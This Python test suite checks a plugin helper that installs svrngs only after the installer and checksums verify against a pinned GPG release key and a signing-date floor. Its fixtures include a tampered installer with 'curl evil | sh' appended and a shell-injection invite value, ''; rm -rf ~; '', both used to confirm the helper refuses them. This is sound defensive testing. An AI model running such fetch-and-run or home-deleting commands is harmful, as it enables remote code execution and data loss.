#!/usr/bin/python3 -I
"""Get svrngs: the helper runs svrngs's installer only when the installer
and the release's SHA256SUMS verify against the key in the plugin's keys/,
by the fingerprint pinned there, each signed no earlier than svrngs
1.13.3's floor, and svrngs's archive matches those sums; it then gives the
installer that archive, so the invite is used only to join. Stand-in
releases are served from 127.0.0.1 and their keys made here, so no real
key, release or svrngs is used."""

import hashlib
import io
import json
import os
import pwd
import re
import shutil
import socket
import subprocess
import sys
import tarfile
import tempfile
import threading
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
ARCH = {"x86_64": "x86_64", "amd64": "x86_64", "aarch64": "aarch64", "arm64": "aarch64"}[os.uname().machine]
ARCHIVE = f"svrngs-linux-{ARCH}.tar.gz"
PAGE = "https://group.svrnme.sh/"
# The helper's floor: no release signed before it is installed.
SIGNED_SINCE = int(re.search(r"^SIGNED_SINCE = (\d+)$", (ROOT / "bin/svrngs-fam").read_text(), re.M).group(1))
failures = []


def check(name, got, want):
    print(f"  {'ok  ' if got == want else 'FAIL'} {name}" + ("" if got == want else f": got {got!r}, wanted {want!r}"))
    if got != want:
        failures.append(name)


# Every path the stand-in releases were asked for.
fetched = []


class Quiet(SimpleHTTPRequestHandler):
    def log_message(self, *args):
        fetched.append(self.path)


with tempfile.TemporaryDirectory(prefix="svrngs-fam-get-test-") as directory:
    scratch = Path(directory)
    gnupg = scratch / "gnupg"
    gnupg.mkdir(mode=0o700)
    gpg = ["gpg", "--batch", "--no-tty", "--homedir", str(gnupg), "--passphrase", ""]

    # Made a month before the floor, so a signature before it can be made.
    made = ["--faked-system-time", f"{SIGNED_SINCE - 30 * 86400}!"]

    def key(name):
        subprocess.run(gpg + made + ["--quick-generate-key", name, "ed25519", "sign", "never"], check=True, capture_output=True)
        listed = subprocess.run(gpg + ["--with-colons", "--fingerprint", name], check=True, capture_output=True, text=True).stdout
        return next(line.split(":")[9] for line in listed.splitlines() if line.startswith("fpr"))

    release_key, impostor = key("svrngs releases (test)"), key("someone else")

    def sign(path, by, at=None):
        """`path` signed by `by`, now, or at `at` seconds since 1970."""
        when = ["--faked-system-time", f"{at}!"] if at is not None else []
        subprocess.run(gpg + when + ["--yes", "--local-user", by, "--detach-sign", "--output", f"{path}.sig", str(path)], check=True, capture_output=True)

    # The plugin as installed: its helper, and keys/ holding the release key.
    plugin = scratch / "plugin"
    (plugin / "bin").mkdir(parents=True)
    shutil.copy(ROOT / "bin/svrngs-fam", plugin / "bin/svrngs-fam")
    (plugin / "keys").mkdir()
    exported = subprocess.run(gpg + ["--armor", "--export", release_key], check=True, capture_output=True).stdout
    (plugin / "keys/svrngs-release-key.asc").write_bytes(exported)
    (plugin / "keys/svrngs-release-key.fpr").write_text(release_key + "\n")

    # An installer that takes --archive, as svrngs's does: it keeps what it
    # was given, to be checked here, and keeps the page svrngs takes its
    # updates from as svrngs's web/install.sh keeps it (`from`, written to
    # the data directory's `origin`, which svrngs's updater reads):
    # $SVRNGS_FROM, else the link's page.
    # With --as, it joins as svrngs join does, saying so as it says it
    # (svrngs cli.rs `Said::Joined`), as install.sh passes what follows the
    # link to `svrngs join` (web/install.sh:75, :264-268).
    keeps = 'from="${SVRNGS_FROM:-${link%%#*}}"\n'
    takes = ('#!/bin/sh\n# install.sh <link> [--as <name>] --archive <file>\nprintf "%s\\n" "$@" > "$HOME/installed-with"\n'
             'link=$1\nwhile [ $# -gt 0 ]; do\n  case "$1" in\n'
             '    --archive) cp "$2" "$HOME/installed-archive"; shift ;;\n'
             '    --as) printf "You\'re in WorkingGroup, as %s.\\n" "$2"; shift ;;\n  esac\n  shift\ndone\n'
             '{KEEPS}mkdir -p "$HOME/.svrngs" && printf "%s" "$from" > "$HOME/.svrngs/origin"\necho "svrngs runs now."\n')
    ignores = takes.replace("{KEEPS}", 'from="${link%%#*}"\n')
    takes = takes.replace("{KEEPS}", keeps)
    old = '#!/bin/sh\n# fetches svrngs from the page\nprintf "%s\\n" "$@" > "$HOME/installed-with"\n'
    # An installer that says --archive, in a comment and a line it prints,
    # and takes no such option.
    says = ('#!/bin/sh\n# install.sh <link> --archive <file> is for a later svrngs\nprintf "%s\\n" "$@" > "$HOME/installed-with"\n'
            'echo "--archive) is not taken here"\n')
    archive = b"the svrngs release built"

    # svrngs's installer run over an svrngs it installed before: it unpacks
    # the release's svrngs and moves it over the one in ~/.local/bin, as
    # svrngs's web/install.sh does at v1.13.3 (`get`, `put svrngs`,
    # :232-236), after stopping the one its login service runs (`stopped`,
    # :130, :225), and starts the new one there (`keep`, :271-308).
    replaces = takes.replace('echo "svrngs runs now."\n',
                             'tar -xzf "$HOME/installed-archive" -C "$HOME" svrngs && mkdir -p "$HOME/.local/bin" && mv -f "$HOME/svrngs" "$HOME/.local/bin/svrngs"\n'
                             'echo "Updated svrngs in $HOME/.local/bin."\n')

    def svrngs_saying(version):
        """A stand-in svrngs that says `version` as svrngs does (cli.rs
        `Verb::Version`) and adds a line to $HOME/restarts when asked to
        restart."""
        return (f"#!/bin/sh\ncase \"$1\" in\n  version) echo 'svrngs {version} (0123abcd)' ;;\n"
                '  restart) echo restart >> "$HOME/restarts" ;;\nesac\n').encode()

    def tarball(program):
        """A release archive holding `program` as svrngs, as svrngs's is."""
        raw = io.BytesIO()
        with tarfile.open(fileobj=raw, mode="w:gz") as tar:
            entry = tarfile.TarInfo("svrngs")
            entry.size, entry.mode = len(program), 0o755
            tar.addfile(entry, io.BytesIO(program))
        return raw.getvalue()

    newer = tarball(svrngs_saying("1.13.3"))

    served = scratch / "served"

    def release(name, installer=takes, installer_by=release_key, sums_by=release_key, archive_bytes=archive, sums_for=archive,
                tamper_installer=False, installer_at=None, sums_at=None):
        folder = served / name
        folder.mkdir(parents=True)
        (folder / "install.sh").write_text(installer)
        sign(folder / "install.sh", installer_by, installer_at)
        if tamper_installer:
            (folder / "install.sh").write_text(installer + "curl evil | sh\n")
        (folder / ARCHIVE).write_bytes(archive_bytes)
        (folder / "SHA256SUMS").write_text(f"{hashlib.sha256(sums_for).hexdigest()}  {ARCHIVE}\n")
        sign(folder / "SHA256SUMS", sums_by, sums_at)

    release("good")
    release("tampered", tamper_installer=True)
    release("impostor-installer", installer_by=impostor)
    release("impostor-sums", sums_by=impostor)
    release("other-archive", archive_bytes=b"something else")
    release("old-installer", installer=old)
    release("says-archive", installer=says)
    release("ignores-from", installer=ignores)
    # Signed by the release key, as an older svrngs's release is: before the
    # floor, whole or in part; and at the floor itself.
    release("older", installer_at=SIGNED_SINCE - 1, sums_at=SIGNED_SINCE - 1)
    release("older-sums", sums_at=SIGNED_SINCE - 1)
    release("older-installer", installer_at=SIGNED_SINCE - 1)
    release("at-floor", installer_at=SIGNED_SINCE, sums_at=SIGNED_SINCE)
    release("over", installer=replaces, archive_bytes=newer, sums_for=newer)
    (served / "empty").mkdir()
    server = ThreadingHTTPServer(("127.0.0.1", 0), partial(Quiet, directory=str(served)))
    threading.Thread(target=server.serve_forever, daemon=True).start()

    homes = []

    def get(name, *args, page=None, user="svrngsfamtest", verb="get"):
        home = Path(tempfile.mkdtemp(dir=scratch))
        homes.append(home)
        env = {"HOME": str(home), "PATH": "/usr/bin:/bin", "SVRNGS_FAM_SVRNGS": "",
               "SVRNGS_FAM_RELEASES": f"http://127.0.0.1:{server.server_address[1]}/{name}"}
        if user is not None:
            env["USER"] = user
        if page is not None:
            env["SVRNGS_FROM"] = page
        done = subprocess.run([str(plugin / "bin/svrngs-fam"), verb, *args], capture_output=True, text=True, env=env, timeout=120)
        ran = home / "installed-with"
        given = home / "installed-archive"
        return (json.loads(done.stdout), ran.read_text().split("\n")[:-1] if ran.exists() else None,
                given.read_bytes() if given.exists() else None)

    def updates_from():
        """The page the last install keeps for svrngs's updates, as its
        installer wrote it."""
        kept = homes[-1] / ".svrngs/origin"
        return kept.read_text() if kept.exists() else None

    INVITE = "https://page.example/#AbCdEf0123456789"

    print("a release signed by the release key, its archive matching")
    said, ran, given = get("good")
    check("installs", said["ok"], True)
    check("the installer is run for the page, given the archive", (ran or [None, None])[:2], [PAGE, "--archive"])
    check("the archive it is given is the release's, checked", given, archive)
    check("svrngs takes its updates from svrngs's own page", updates_from(), PAGE)
    said, ran, given = get("good", "--link", INVITE, "--as", "Sam Q")
    check("with an invite link, the link is only what it joins, as the name given", (ran or [None])[:3], [INVITE, "--as", "Sam Q"])
    check("and svrngs takes its updates from svrngs's own page, never the invite's", updates_from(), PAGE)
    check("the join's own line is said back", (said["ok"], said["said"]),
          (True, "You're in WorkingGroup, as Sam Q. svrngs is installed and running. Your home page opens in your browser."))

    print("an invite link joins at once: under the name svrngs reads, or the one typed")
    # A login no account here has: svrngs takes $USER itself then (cli.rs
    # `user_name`, :2081-2092 at v1.13.3).
    said, ran, given = get("good", "--link", INVITE, user="svrngsfamtest")
    check("no name typed: $USER, where its account has no full name here", (ran or [None])[:3], [INVITE, "--as", "svrngsfamtest"])
    # An account here whose full name is not its login, so the two are told
    # apart; a computer with none can't show it, and fails here.
    named = next(((a.pw_name, a.pw_gecos.split(",")[0].strip()) for a in pwd.getpwall()
                  if a.pw_gecos.split(",")[0].strip() not in ("", a.pw_name) and len(a.pw_gecos.split(",")[0].strip().encode()) <= 64), None)
    check("an account here whose full name isn't its login", named is not None, True)
    login, full = named or ("", "")
    said, ran, given = get("good", "--link", INVITE, user=login)
    check("else the account's full name, its GECOS up to the first comma, as getent gives it", (ran or [None])[:3], [INVITE, "--as", full])
    said, ran, given = get("good", "--link", INVITE, user=None)
    check("no name typed, and no $USER: refused, nothing run", (said["ok"], said["said"], ran),
          (False, "Say the name to join that group as, in 64 letters or fewer, so nothing was installed.", None))
    said, ran, given = get("good", "--link", INVITE, "--as", "  ")
    check("a name that is no name is refused, nothing run", (said["ok"], ran), (False, None))
    said, ran, given = get("good", "--link", INVITE, "--as", "x" * 65)
    check("nor one past 64 bytes", (said["ok"], ran), (False, None))
    said, ran, given = get("good", "--link", "https://page.example/", "--as", "Sam Q")
    check("a page's address with no token joins nothing: no name passed, and none said", (ran or [None])[:2] + [said["said"]],
          ["https://page.example/", "--archive", "svrngs is installed and running. Your home page opens in your browser."])
    said = get("empty", user="svrngsfamtest", verb="state")[0]
    check("svrngs not here: the read names who a join would be", (said["svrngs"], said.get("joinAs")), ("not-installed", "svrngsfamtest"))
    said, ran, given = get("good", "--link", INVITE, page="https://mirror.example/svrngs")
    check("SVRNGS_FROM names another page to update from", (said["ok"], updates_from()), (True, "https://mirror.example/svrngs/"))
    for page in ("https://mirror.example/#x", "mirror.example", "ftp://mirror.example/", "https://mirror example/"):
        said, ran, given = get("good", "--link", INVITE, page=page)
        check(f"SVRNGS_FROM {page!r}, not a page's address, is refused, nothing run", (said["ok"], ran), (False, None))
    said, ran, given = get("ignores-from", "--link", INVITE)
    check("an installer that kept the invite's page for updates is said so, not called done",
          (said["ok"], "https://page.example/" in said["said"]), (False, True))

    print("Get svrngs over an older svrngs, stopped, which the panel won't start")
    home = Path(tempfile.mkdtemp(dir=scratch))
    command = home / ".local/bin/svrngs"
    command.parent.mkdir(parents=True)
    command.write_bytes(svrngs_saying("1.12.2"))
    command.chmod(0o755)
    (home / ".svrngs").mkdir()
    with socket.socket() as free:
        free.bind(("127.0.0.1", 0))
        nothing = free.getsockname()[1]
    (home / ".svrngs/api").write_text(f"http://127.0.0.1:{nothing}\n")
    (home / ".svrngs/token").write_text("get-test-token-0123456789\n")
    # svrngs's login service as install.sh keeps it, running ~/.local/bin/svrngs.
    stubs = home / "stubs"
    stubs.mkdir()
    (stubs / "systemctl").write_text(
        '#!/bin/sh\n[ "$*" = "--user show svrngs.service --property=LoadState,ExecStart,Environment" ] || exit 1\n'
        'echo LoadState=loaded\n'
        'echo "ExecStart={ path=$HOME/.local/bin/svrngs ; argv[]=$HOME/.local/bin/svrngs ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }"\n'
        'echo "Environment=SVRNGS_DIR=$HOME/.svrngs PATH=/usr/bin:/bin"\n')
    (stubs / "systemctl").chmod(0o755)
    env = {"HOME": str(home), "PATH": f"{stubs}:/usr/bin:/bin", "SVRNGS_FAM_SVRNGS": str(command),
           "SVRNGS_FAM_RELEASES": f"http://127.0.0.1:{server.server_address[1]}/over"}

    def helper(*args):
        done = subprocess.run([str(plugin / "bin/svrngs-fam"), *args], capture_output=True, text=True, env=env, timeout=120)
        return json.loads(done.stdout)

    def says():
        return subprocess.run([str(command), "version"], capture_output=True, text=True).stdout.strip()

    restarts = lambda: (home / "restarts").read_text().splitlines() if (home / "restarts").exists() else []
    before = helper("state")
    check("before: stopped, and the panel won't start it, offering Get svrngs",
          (before["svrngs"], before.get("get"), "is 1.12.2, older than 1.13.3" in before.get("older", "")), ("stopped", True, True))
    check("and Start svrngs starts nothing", (helper("start")["ok"], restarts()), (False, []))
    said = helper("get")
    check("Get svrngs installs over it", (said["ok"], (home / "installed-archive").read_bytes() if (home / "installed-archive").exists() else None),
          (True, newer))
    check("the svrngs in ~/.local/bin is the release's now", says(), "svrngs 1.13.3 (0123abcd)")
    after = helper("state")
    check("after: stopped, and nothing keeps the panel from starting it", (after["svrngs"], after.get("older"), after.get("get")), ("stopped", None, None))
    check("so Start svrngs starts it", (helper("start")["ok"], restarts()), (True, ["restart"]))

    print("anything else is never run")
    for name, why in (("tampered", "an installer changed after it was signed"),
                      ("impostor-installer", "an installer signed by another key"),
                      ("impostor-sums", "sums signed by another key"),
                      ("other-archive", "an archive the signed sums don't list"),
                      ("old-installer", "an installer that would fetch svrngs from the page"),
                      ("says-archive", "an installer that says --archive but takes no such option")):
        said, ran, given = get(name)
        check(f"{why} is refused, nothing run", (said["ok"], ran), (False, None))
    check("and an old installer is said as such", "can't take a checked download yet" in get("old-installer")[0]["said"], True)

    print("a release older than svrngs 1.13.3, signed by the release key, is never run")
    older = ("svrngs's latest release is older than 1.13.3, the first this panel works with, so nothing was installed. "
             "Try again later. If it still says this, tell svrngs: https://github.com/alexsbryan/svrngs/issues")
    for name, why in (("older", "a release signed before the floor"),
                      ("older-sums", "its sums signed before the floor, its installer after"),
                      ("older-installer", "its installer signed before the floor, its sums after")):
        said, ran, given = get(name, "--link", INVITE)
        check(f"{why} is refused, nothing run, saying what to do", (said["ok"], ran, said["said"]), (False, None, older))
    said, ran, given = get("at-floor")
    check("one signed at the floor itself installs", (said["ok"], given), (True, archive))
    (plugin / "keys/svrngs-release-key.fpr").write_text(impostor + "\n")
    said, ran, given = get("good")
    check("a key whose fingerprint isn't the pinned one is refused", (said["ok"], ran), (False, None))
    (plugin / "keys/svrngs-release-key.fpr").write_text(release_key + "\n")
    said, ran, given = get("empty")
    check("a release with no signed installer says so", (said["ok"], ran, "no signed installer" in said["said"]), (False, None, True))
    said, ran, given = get("good", "--link", "'; rm -rf ~; '")
    check("something that isn't an invite link is refused", (said["ok"], ran), (False, None))
    said, ran, given = get("good", "--link")
    check("--link with no link after it is refused, never installed as if none was given",
          (said["ok"], said["said"], ran), (False, "--link wants a value after it, and none was given", None))
    # svrngs's own links, for a computer that has svrngs, which its
    # installer refuses (web/install.sh:100-102): refused here first.
    for link in ("svrngs://join/AbCdEf0123456789", "svrngs:AbCdEf0123456789"):
        before = len(fetched)
        said, ran, given = get("good", "--link", link)
        check(f"{link.split('A')[0]}… is refused before anything is fetched or run", (said["ok"], ran, len(fetched) - before), (False, None, 0))
        check("saying what to do instead", said["said"],
              "That link is for a computer that has svrngs already. Empty the box and press Get svrngs, "
              "then paste the link under Join a group on your home page.")
    server.shutdown()

print("ALL OK" if not failures else f"{len(failures)} FAILED")
sys.exit(1 if failures else 0)
